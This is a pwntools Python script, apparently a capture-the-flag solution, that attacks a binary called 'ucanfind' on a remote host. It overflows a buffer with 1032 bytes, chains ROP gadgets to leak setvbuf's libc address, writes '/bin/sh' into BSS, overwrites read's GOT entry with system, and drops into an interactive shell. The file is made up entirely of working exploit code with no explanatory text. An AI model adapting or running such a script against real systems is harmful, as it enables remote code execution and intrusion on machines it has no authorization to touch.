from pwn import *

#p = process("./ucanfind")
p = remote("kshgroup.kr",19192)
e = ELF("./ucanfind")

puts_plt = 0x400520
setvbuf_got = 0x601038
read_plt = 0x400540
read_got = 0x601028
bss = e.bss()
pr = 0x4007B3
ppr = 0x4007B1
log.info("Address of BSS : "+str(hex(bss)))

payload = 'A'*1032

# leak setvbuf
payload += p64(pr)
payload += p64(setvbuf_got)
payload += p64(puts_plt)

# Write /bin/sh into BSS
payload += p64(ppr)
payload += p64(bss)
payload += p64(0)
payload += p64(read_plt)

# Write system into read_got
payload += p64(ppr)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

# Progress system with /bin/sh
payload += p64(pr)
payload += p64(bss)
payload += p64(read_plt)

p.recvuntil("name : ")
p.sendline(payload)

setvbuf_addr = u64(p.recv(8).strip().ljust(8,"\x00"))
log.info("Address of setvbuf : "+str(hex(setvbuf_addr)))

system_addr = setvbuf_addr - 0x31eb0
log.info("Address of system : "+str(hex(system_addr)))

p.send("/bin/sh\00")
sleep(0.5)
p.send(p64(system_addr))
sleep(0.5)
p.interactive()
